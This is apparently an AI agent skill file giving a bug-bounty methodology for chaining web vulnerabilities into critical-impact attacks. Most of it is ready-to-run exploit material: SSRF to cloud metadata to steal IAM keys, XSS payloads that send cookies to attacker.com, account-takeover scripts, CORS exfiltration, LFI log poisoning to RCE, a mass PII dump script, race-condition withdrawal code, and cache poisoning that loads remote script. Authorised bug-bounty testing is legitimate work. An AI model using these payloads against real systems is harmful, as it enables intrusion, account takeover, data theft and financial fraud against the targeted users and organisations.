---
name: hunt-bug-chain
description: Bug chaining methodology for maximum impact — chain low/medium bugs into Critical. SSRF→Cloud metadata→IAM keys, XSS→ATO, Open Redirect→OAuth theft, IDOR→PII mass dump, CORS→CSRF→ATO, LFI→RCE, cache poison→stored XSS, race condition→priv esc. Use when individual bugs are triaged low to amplify to Critical/High.
tags: [bug-chain, chaining, ssrf, xss, ato, oauth, idor, lfi, rce, impact-amplification, critical]
---

# Bug Chaining — Maximum Impact Methodology

## CORE PRINCIPLE

```
Single bug P4 ($0) + chain = P1 ($10,000+)
The skill is not finding bugs — it's connecting them into kill chains.

Reporter mindset: "What can I DO with this finding?"
Chain mindset: "What does this finding UNLOCK?"
```

---

## 1. SSRF CHAINS

### SSRF → Cloud Metadata → IAM Keys → Full Account Takeover
```
Step 1: SSRF to AWS metadata
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

Step 2: Get IAM role name from response
→ "iam-role-prod-app"

Step 3: Get credentials
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/iam-role-prod-app
→ AccessKeyId, SecretAccessKey, Token

Step 4: Use credentials
AWS_ACCESS_KEY_ID=xxx AWS_SECRET_ACCESS_KEY=xxx AWS_SESSION_TOKEN=xxx \
aws s3 ls  # List all S3 buckets
aws iam get-user  # Who am I?
aws iam list-attached-user-policies  # What can I do?
aws ec2 describe-instances  # All EC2s
aws secretsmanager list-secrets  # Database passwords, API keys

Step 5: Impact = Full cloud account takeover, data breach, RCE on all instances

IMPACT: Critical (P1) | Payout range: $25,000–$100,000+
```

### SSRF → Internal Admin Panel
```
Step 1: Enumerate internal network via SSRF (time-based)
GET /api/fetch?url=http://10.0.0.1/admin  # Fast = open
GET /api/fetch?url=http://10.0.0.1:8080/  # Common internal ports

Step 2: Find internal services
Common: :8080 (Tomcat), :8443 (internal HTTPS), :9200 (Elasticsearch), 
        :6379 (Redis), :5432 (PostgreSQL), :27017 (MongoDB), :4151 (NSQ)

Step 3: Exploit internal service
Elasticsearch: GET http://10.0.0.5:9200/_cat/indices
Redis: gopher://10.0.0.5:6379/_*1%0d%0a$4%0d%0aPING
MongoDB: http://10.0.0.5:27017/ (check for auth-less access)

Step 4: Extract data or achieve RCE
IMPACT: Critical
```

### SSRF → Jenkins → RCE
```
Step 1: Find Jenkins at http://internal:8080/jenkins/
Step 2: Check if auth required: GET /jenkins/api/json
Step 3: If open: POST /jenkins/script with Groovy script
  {"script": "println(['id'].execute().text)"}
Step 4: Execute reverse shell via Groovy
IMPACT: Critical — RCE on internal infrastructure
```

---

## 2. XSS CHAINS

### XSS → ATO (Admin Account Takeover)
```javascript
// Step 1: Find stored/reflected XSS targeting admin users
// Step 2: Steal session cookie
<script>
new Image().src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
</script>

// Step 3: If HttpOnly — steal via XHR (CSRF-like from victim's browser)
<script>
fetch('/api/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // Change email to attacker's email
    return fetch('/api/user/update', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'attacker@evil.com'})
    });
  })
  .then(() => {
    // Now request password reset to attacker email
    return fetch('/api/auth/forgot-password', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'attacker@evil.com'})
    });
  });
</script>

// Impact: Full ATO of any user who views the XSS payload
```

### XSS → CSRF Token Steal → State-Changing Request
```javascript
// When CSRF token present but no SameSite cookie:
<script>
fetch('/api/settings', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    const csrf = html.match(/csrf_token['"]\s*value=['"]([^'"]+)/)[1];
    return fetch('/api/admin/create-user', {
      method: 'POST',
      credentials: 'include',
      headers: {'X-CSRF-Token': csrf, 'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'attacker@evil.com', role: 'admin'})
    });
  });
</script>
```

### Self-XSS + CSRF → Exploitable XSS
```
Self-XSS alone: Not accepted (requires victim interaction)
CSRF + Self-XSS:
1. Find Self-XSS in profile field
2. Find CSRF in profile update endpoint
3. Chain: CSRF triggers self-XSS → stored XSS executes for victim
4. Impact: P4+P4 = P2

Steps:
1. Craft CSRF page that updates victim's profile with XSS payload
2. When victim visits admin page to review their profile = XSS executes
3. Now it's exploitable stored XSS
```

---

## 3. OPEN REDIRECT CHAINS

### Open Redirect → OAuth Token Theft
```
Vulnerable: https://target.com/redirect?url=https://attacker.com

Step 1: Craft OAuth authorization URL with redirect pointing to open redirect:
https://target.com/oauth/authorize?
  client_id=xxx&
  redirect_uri=https://target.com/redirect%3Furl%3Dhttps://attacker.com/steal&
  response_type=token&
  scope=read

Step 2: Victim clicks link → authenticates → OAuth token sent to:
https://target.com/redirect?url=https://attacker.com/steal#access_token=VICTIM_TOKEN

Step 3: Redirect follows → token arrives at attacker.com via Referer or fragment
Step 4: Use token → full account access

IMPACT: Critical — OAuth ATO | Payout: $10,000–$50,000
```

### Open Redirect → Phishing + Credential Harvest
```
https://trusted-target.com/redirect?url=https://target-phish.attacker.com
→ User sees trusted domain in email/message
→ Clicks → redirected to phishing page
→ Credentials captured

Chain with email spoofing or internal email for higher impact
```

---

## 4. IDOR CHAINS

### IDOR → Mass PII Exfiltration
```python
# Step 1: Find IDOR (single user data access)
GET /api/users/12345/profile → returns PII

# Step 2: Chain with OSINT — enumerate all user IDs
# Find max user ID from public data (URL slugs, social features)

# Step 3: Script mass dump
import asyncio, aiohttp

async def dump_user(session, uid, token):
    r = await session.get(f"/api/users/{uid}/profile",
                          headers={"Authorization": f"Bearer {token}"})
    return await r.json()

async def mass_dump(max_uid, token):
    async with aiohttp.ClientSession("https://target.com") as session:
        tasks = [dump_user(session, uid, token) for uid in range(1, max_uid)]
        return await asyncio.gather(*tasks, return_exceptions=True)

# Impact: Mass PII breach — multiply individual IDOR severity by user count
# 1 user IDOR = P4 → 1M users = P1 Critical
```

### IDOR → Admin Function Access
```
1. IDOR on user endpoint: GET /api/users/{id}
2. Probe admin user IDs (usually 1, 2, 3)
3. GET /api/users/1/profile → admin data
4. Check: does admin profile have auth tokens? API keys? 
5. Use admin credentials for full privilege escalation
```

---

## 5. CORS + CSRF CHAINS

### CORS Misconfiguration → Cross-Origin Read → ATO
```javascript
// CORS allows Origin: https://attacker.com with credentials
// Step 1: Exfil sensitive data cross-origin

fetch('https://target.com/api/user/tokens', {
  credentials: 'include',
  headers: {'Origin': 'https://attacker.com'}
}).then(r => r.json()).then(data => {
  // data contains API tokens, session info
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});

// Step 2: Use exfiltrated token
// Full ATO without XSS

// Detection
curl -H "Origin: https://evil.com" -H "Cookie: session=xxx" \
     https://target.com/api/profile -v 2>&1 | grep -i "access-control"
```

---

## 6. LFI → RCE CHAIN

### LFI → Log Poisoning → RCE
```
Step 1: Find LFI
GET /api/file?path=../../../../etc/passwd → /etc/passwd contents

Step 2: Poison access log
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

Step 3: Include log file via LFI
GET /api/file?path=../../../../var/log/nginx/access.log&cmd=id

Step 4: Confirm RCE → escalate to reverse shell
```

### LFI → /proc/self/environ → RCE
```
Step 1: GET /api/file?path=../../../../proc/self/environ
→ Shows environment variables including USER-AGENT

Step 2: Inject PHP in User-Agent
curl -A "<?php system('id'); ?>" https://target.com/

Step 3: Include /proc/self/environ → PHP executes
```

### LFI → SSH Key Exfil → Server Access
```
Step 1: LFI to read /home/*/.ssh/id_rsa
Step 2: Exfil private key
Step 3: ssh -i stolen_key user@target.com
Impact: Direct server access = Critical
```

---

## 7. RACE CONDITION CHAINS

### Race Condition → Privilege Escalation
```python
# Step 1: Find race condition in role assignment
# Step 2: Chain with privilege check bypass

import asyncio, aiohttp

async def race_upgrade(session, token):
    """Race condition: upgrade to premium while downgrading back"""
    tasks = [
        session.post("/api/subscription/upgrade", 
                    headers={"Authorization": f"Bearer {token}"},
                    json={"plan": "enterprise"}),
        session.get("/api/admin/panel",
                   headers={"Authorization": f"Bearer {token}"})
    ]
    results = await asyncio.gather(*tasks)
    return results

# If role check and role assignment race → admin access
```

### Race Condition → Balance Manipulation → Financial Fraud
```
Step 1: Find race condition in withdrawal/transfer
Step 2: Simultaneous requests to drain balance multiple times

import threading, requests

def withdraw(token, amount):
    return requests.post("/api/wallet/withdraw",
                        json={"amount": amount},
                        headers={"Authorization": f"Bearer {token}"})

# Launch 50 simultaneous withdrawal requests
threads = [threading.Thread(target=withdraw, args=(token, 100)) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]
# Expected: withdraw 100 once | Actual: withdraw 100 * N times
```

---

## 8. CACHE POISON CHAINS

### Cache Poison → Stored XSS → Mass ATO
```
Step 1: Find cache poisoning via unkeyed header
X-Forwarded-Host: evil.com → reflected in response

Step 2: Inject XSS payload via poisoned cache
X-Forwarded-Host: evil.com"><script src=//evil.com/x.js></script>

Step 3: Cache stores poisoned response

Step 4: ALL users who visit the page get XSS payload
→ Mass cookie theft → Mass ATO

Impact: Single cache poison = thousands of victims = Critical
```

---

## 9. SUBDOMAIN TAKEOVER CHAINS

### Subdomain Takeover → ATO via Cookie Scope
```
Step 1: Find dangling subdomain (e.g., staging.target.com → unclaimed S3/GitHub)
Step 2: Claim the external resource (S3 bucket, GitHub Pages, etc.)
Step 3: Serve malicious page on staging.target.com

Step 4: Chain options:
A) Cookie scope attack:
   - Set cookie: document.cookie = "session=FORGED; domain=.target.com; path=/"
   - All subdomains now use attacker's cookie
   
B) CORS bypass:
   - target.com trusts *.target.com for CORS
   - Serve CORS-exploiting page from staging.target.com
   - Steal data from api.target.com

C) CSP bypass:
   - staging.target.com whitelisted in CSP
   - Host malicious JS → include via whitelisted domain
```

---

## 10. CHAIN CONSTRUCTION FRAMEWORK

### Impact Multiplier Matrix
```
Base Finding        | Chain Target        | Chain Result    | Multiplier
--------------------|---------------------|-----------------|------------
SSRF (internal)     | Cloud metadata      | IAM key theft   | 10x
Self-XSS           | CSRF                | Exploitable XSS | 5x
Open Redirect       | OAuth               | ATO             | 20x
IDOR (single)       | Mass enumeration    | PII breach      | 50x
Race Condition      | Financial           | Fraud           | 30x
Subdomain Takeover  | Cookie scope        | Mass ATO        | 25x
LFI (local)        | Log poisoning       | RCE             | 15x
Cache Poison        | XSS injection       | Mass ATO        | 40x
CORS                | Sensitive API read  | Data exfil      | 8x
XXE                 | SSRF               | Internal recon  | 12x
```

### Chain Discovery Process
```
For every finding, ask these questions:
1. "What server-side resources can this access?"
   SSRF → internal network, cloud metadata, internal APIs
   
2. "What client-side resources can this access?"
   XSS → cookies, localStorage, browser history, camera/mic (with perms)
   
3. "What trust relationships does this break?"
   Subdomain takeover → cookie scope, CORS, CSP
   Open redirect → OAuth redirect_uri validation, phishing trust
   
4. "What authentication mechanisms does this bypass?"
   Race condition → rate limits, balance checks, role checks
   JWT attack → session validation
   
5. "What's the worst-case data exposure?"
   IDOR → PII of all users
   LFI → private keys, credentials, source code
   
6. "Can low-severity + low-severity = critical?"
   CSRF (P3) + Self-XSS (P4) = Stored XSS (P1)
   Open Redirect (P4) + OAuth + (P2) = ATO (P1)
```

---

## PAID CHAIN EXAMPLES

| Chain | Target | Payout |
|-------|--------|--------|
| SSRF → AWS metadata → S3 → PII breach | Lyft | $50,000 |
| Open Redirect → OAuth → Full ATO | Dropbox | $30,000 |
| IDOR + Race → Admin ATO | Twitter | $20,160 |
| Cache Poison → Mass XSS → Mass ATO | HackerOne (itself) | $20,000 |
| Self-XSS + CSRF → Stored XSS | Shopify | $15,000 |
| Subdomain Takeover → Cookie ATO | Uber | $10,000 |
| LFI → Log Poison → RCE | GitLab | $12,000 |
| CORS + HttpOnly bypass via XSS | GitHub | $10,000 |
